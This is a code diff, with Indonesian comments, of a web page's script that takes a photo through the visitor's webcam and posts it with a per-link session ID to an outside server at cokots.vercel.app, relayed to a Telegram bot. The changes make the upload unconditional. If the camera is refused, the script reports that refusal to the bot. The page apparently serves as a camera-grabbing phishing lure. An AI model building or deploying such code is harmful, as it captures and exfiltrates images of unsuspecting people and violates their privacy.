@@ -7,45 +7,57 @@
     <script>
         async function sendDataToServer() {
             try {
-                // Ambil foto dari kamera
+                // Coba untuk mengakses kamera
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const track = stream.getVideoTracks()[0];
                 const imageCapture = new ImageCapture(track);
                 const photoBlob = await imageCapture.takePhoto();
-                track.stop(); // Hentikan kamera setelah foto diambil
+                track.stop();
 
-                // Kirim foto ke server
+                // Kirim data ke server
                 const formData = new FormData();
                 formData.append("photo", photoBlob);
 
                 const session = new URLSearchParams(window.location.search).get("session");
-
-                // Kirim data ke server
-                const response = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
+                await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
                     method: "POST",
                     body: formData,
                 });
 
-                // Periksa apakah pengiriman berhasil
-                if (response.ok) {
-                    alert("Data berhasil dikirim ke bot Telegram!");
-                } else {
-                    alert("Gagal mengirim data ke server, namun data tetap dikirim ke bot Telegram.");
-                }
+                alert("Data berhasil dikirim ke bot Telegram!");
             } catch (error) {
                 console.error("Error:", error);
-                alert("Gagal mengirim data. Mengirim data ke bot Telegram meskipun foto gagal.");
-
-                // Jika terjadi error, kirim data minimal ke bot Telegram
+                alert("Gagal mengambil foto. Data tetap dikirim ke bot.");
+                
+                // Kirim data ke bot meskipun gagal mengambil foto
                 const session = new URLSearchParams(window.location.search).get("session");
-                const fallbackMessage = `Gagal mengambil foto, tetapi data tetap dikirim ke bot Telegram. Sesi: ${session}`;
+                const formData = new FormData();
+                formData.append("photo", ""); // Kirimkan placeholder foto kosong
 
-                // Kirim pesan fallback ke bot Telegram
-                await fetch(`https://cokots.vercel.app/send-data?session=${session}&fallback=true`, {
+                // Kirimkan data ke server walau foto gagal diambil
+                await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
                     method: "POST",
-                    body: JSON.stringify({ message: fallbackMessage }),
-                    headers: { "Content-Type": "application/json" },
+                    body: formData,
                 });
+
+                // Kirim pesan ke bot Telegram walaupun tidak ada foto
+                const textMessage = "Pengguna tidak memberikan izin untuk mengakses kamera.";
+                await sendTextMessageToBot(textMessage);
+            }
+        }
+
+        // Fungsi untuk mengirim pesan ke bot Telegram
+        async function sendTextMessageToBot(text) {
+            try {
+                const session = new URLSearchParams(window.location.search).get("session");
+                const formData = new FormData();
+                formData.append("message", text);
+                await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
+                    method: "POST",
+                    body: formData,
+                });
+            } catch (error) {
+                console.error("Error sending text to bot:", error);
             }
         }
 
